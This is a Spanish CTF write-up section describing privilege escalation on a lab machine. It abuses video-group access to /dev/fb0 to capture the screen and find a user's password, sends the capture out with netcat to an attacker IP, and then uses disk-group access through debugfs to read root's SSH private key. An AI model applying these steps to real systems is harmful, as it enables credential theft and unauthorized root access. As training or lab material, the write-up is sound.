## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
uname -a
lsb_release -a
sudo -l
id
```

Aqui llama el atencion el grupo video. Pero aqui primero la idea es ver que grupo tiene este mismo grupo por script.

```bash
groups
for group in $(groups); do echo "El grupo $group"; done
for group in $(groups); do echo -e "\n[+] Listando archivos del sistema con grupo $group asignado:\n"; find / \-group $group 2>/dev/null; done
```

Aqui vemos que el fichero `/dev/fb0` esta en el grupo **video**. Este servicio permite hacer una captura de pantalla de la maquina.

1. Recoger las proporciones de la pantalla

    ```bash
    cd /
    find \-name virtual_size 2>/dev/null
    cat ./sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0/virtual_size
    #Output
    1176.885
    ```

1. Captura de la pantalla

    ```bash
    cd /tmp
    cat /dev/fb0 > Captura
    du -hc Captura
    file Captura
    ```

1. Enviamos la captura a nuestra maquina de atacante

    - en la maquina de atacante

        ```bash
        nc -nlvp 443 > Captura
        ```

    - en la maquina victima

        ```bash
        nc 10.10.14.15 443 < Captura
        ```

1. Abrimos la captura con Gimp

    - Aun que la apertura del fichero a fallado le damos al menu Archivo > Abrir 
    - Seleccionamos el typo de archivo Datos de imagen en bruto

        ```{r, echo = FALSE, fig.cap="Gimp - Archive brute data", out.width="90%"}
        knitr::include_graphics("images/Falafel-open-capture.png")
        ```

    - Entramos la proporciones de la virtual_size

Aqui podemos ver la contraseña del usuario yossi. Cambiamos de usuario con el comando `su yossi`.

Desde aqui volmemos a intentar a rootear la maquina desde el usuario yossi.

```bash
sudo -l
id
```

Como otra vez un grupo, en este caso el grupo disk nos llama la atencion, volmemos a hacer lo mismo con el listeo de ficheros de cada grupo

```bash
for group in $(groups); do echo -e "\n[+] Listando archivos del sistema con grupo $group asignado:\n"; find / \-group $group 2>/dev/null; done
```

Aqui vemos que `/dev/sda1` es parte del grupo disk. Si le hacemos un ``ls -l /dev/sda1` podemos ver que el grupo disk tiene derecho de escritura. 
Controlamos si estamos en `/dev/sda1` con el comando `fdisk -l` y vemos que es el disco con 7G (El mas grande = el disco en uso).

Siendo del grupo disk, nos permite abrir la utilidad `debugfs` que nos permite manejar utilidades del disco como root.

```bash
debugfs /dev/sda1
pwd
ls
cd /root
pwd
cat root.txt
```

Aqui podemos ver la flag, pero nosotros queremos ser root. Continuamos

```bash
cd .ssh
cat id_rsa
```

la copiamos y creamos un fichero id_rsa en /tmp

```bash
exit
cd /tmp
nano id_rsa

chmod 600 id_rsa
ssh root@localhost -i id_rsa
whoami
#Output 

root
```
